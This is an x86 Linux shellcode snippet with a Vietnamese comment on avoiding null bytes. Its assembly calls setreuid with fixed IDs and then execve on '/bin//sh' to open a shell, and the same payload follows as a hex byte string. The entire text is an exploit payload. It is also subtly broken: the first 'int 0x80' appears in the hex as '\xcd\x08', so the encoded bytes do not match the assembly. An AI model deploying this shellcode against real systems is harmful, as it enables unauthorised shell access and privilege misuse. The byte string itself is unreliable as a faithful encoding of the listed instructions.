; để hạn chế null byte nhất có thể, k nên move 0 vào reg,
;nên dùng toán tử xor

push   0x46
pop    eax
mov    bx, 0x4b7
mov    cx, 0x453
int    0x80

xor    edx, edx
push   0xb
pop    eax
push   edx
push   0x68732f2f
push   0x6e69622f
mov    ebx, esp
push   edx
push   ebx
mov    ecx, esp
int    0x80
"\x6a\x46\x58\x66\xbb\xb7\x04\x66\xb9\x53\x04\xcd\x08\x31\xd2\x6a\x0b\x58\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\xcd\x80"